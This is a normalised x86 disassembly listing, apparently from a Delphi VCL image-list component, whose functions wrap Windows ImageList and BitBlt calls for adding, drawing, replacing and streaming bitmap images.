mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f072
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov edx eax
mov eax ebx
call sub_44f544
sub_44f078
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f127
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44f10a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44ed74
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44ef50
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ef50
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f111
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
sub_44f144
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f243
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ef50
push eax
mov eax [ ebp - 0x4 ]
call sub_44ef40
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f24a
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44f205
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_427c68
mov eax [ ebp - 0x4 ]
call sub_44ed74
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44ef30
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ef50
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
sub_44f260
push ebx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44ef40
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44f284
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44f49b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f4a2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404450
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fb10
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f144
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
xor eax eax
push ebp
push sub_44f44c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f42c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44f40f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_427b14
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_426d44
call sub_4224e8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44ef40
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_426d44
call sub_4224e8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44ef40
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44ef40
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f416
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
sub_44f4ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f52b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44f260
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax ebx
mov si 0xffef
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f532
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
push esi
mov eax ebx
call sub_44ef40
push eax
call ImageList_Remove
sub_44f544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44eb68
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4038bc
pop esi
pop ebx
retn
sub_44f57c
push ebx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44ef40
push eax
call ImageList_GetBkColor
call sub_44eb88
pop ebx
retn
sub_44f5a4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44eb68
push eax
mov eax ebx
call sub_44f57c
call sub_44eb68
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_4224e8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44ef40
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_426d44
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_421ce0
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_414b64
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_426d44
pop edx
call sub_422084
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_426d44
call sub_4224e8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44ef40
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_414b64
mov eax [ ebx + 0x54 ]
call sub_426d44
call sub_4224e8
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0x80000014
call sub_421ce0
mov eax edi
call sub_4224e8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0x80000010
call sub_421ce0
mov eax edi
call sub_4224e8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_427b14
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44f778
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44f79c
pop ebx
pop ebp
retn 0xc
sub_44f79c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44f7e8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_414b64
mov eax [ ebp - 0x4 ]
call sub_450264
xor eax eax
push ebp
push sub_44f970
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f953
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44f936
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_427b14
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f93d
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_426d44
mov edi eax
lea edx [ ebp - 0x20 ]
mov eax edi
call sub_422084
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_4224e8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_426d44
mov edi eax
lea edx [ ebp - 0x20 ]
mov eax edi
call sub_422084
push 0x10
push 0x0
push 0x0
mov eax edi
call sub_4224e8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f078
inc ebx
dec esi
jne r-xdata
sub_44f980
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44ef40
mov edx eax
mov eax ebx
call sub_44f7e8
sub_44f9a0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
call sub_44efa4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416a84
mov eax ebx
call sub_44f538
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44fb88
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44ef40
mov edx eax
mov eax ebx
call sub_44ee44
mov eax ebx
call sub_44ed6c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44ef40
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44ed74
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44ef40
push eax
call ImageList_GetBkColor
call sub_44eb88
mov edx eax
mov eax ebx
call sub_44f544
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44f980
jmp r-xdata
sub_44fa60
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_416b68
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44fb88
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44f538
mov eax esi
call sub_44ef40
mov edx eax
mov eax ebx
call sub_44ee44
mov eax ebx
call sub_44ed6c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44ef40
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44ed74
jmp r-xdata
mov eax esi
call sub_44ef40
push eax
call ImageList_GetBkColor
call sub_44eb88
mov edx eax
mov eax ebx
call sub_44f544
mov edx esi
mov eax ebx
call sub_44f980
pop esi
pop ebx
retn
sub_44fb10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44fb7c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fb83
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44fbb0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4161a0
mov si 0xffff
call sub_4038bc
inc ebp
dec edi
jne r-xdata
sub_44fc00
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416090
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4161a0
cmp ebp eax
jne r-xdata
sub_44fc58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_418914
push edx
push eax
mov eax esi
call sub_418914
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
call sub_418914
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_4086c8
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44fca0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax ebx
call sub_44f260
mov edi eax
mov eax esi
call sub_44f260
cmp edi eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_44f260
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44fd7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4501e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fd5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4501e8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44fc58
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fd66
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
mov eax esi
call sub_44f260
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44fd90
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44f260
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44fca0
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44fdec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41e51c
mov eax [ ebp - 0x8 ]
push eax
push sub_45015c
mov eax [ ebp - 0x8 ]
push eax
push sub_4501e8
push ebp
call sub_44fd90
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44fe44
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_418b0c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_418b0c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4500c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4188e0
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_418900
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4500ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_427b14
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_414b64
mov eax [ ebp - 0x4 ]
call sub_450264
xor eax eax
push ebp
push sub_45008e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450095
mov eax [ ebp - 0xc ]
call sub_4036c0
mov eax [ ebp - 0x14 ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
call sub_450268
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_414b8c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_426d44
push eax
mov eax [ ebp - 0xc ]
call sub_426d44
lea edx [ ebp - 0x30 ]
pop ecx
call sub_421f50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_414b8c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426d44
push eax
mov eax [ ebp - 0x14 ]
call sub_426d44
lea edx [ ebp - 0x30 ]
pop ecx
call sub_421f50
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f078
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4500d8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x0
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ec90
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450151
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax ebx
call sub_44ef04
mov eax ebx
call sub_44ef40
test eax eax
jne r-xdata
sub eax 0xffffffec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450158
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_45015c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44efa4
mov eax edi
call sub_4188e0
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x8 ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_418900
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44fe44
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_4500d8
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4501e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x0
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ec90
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450259
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push eax
mov eax ebx
call sub_44ef40
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450260
mov eax [ ebp - 0x4 ]
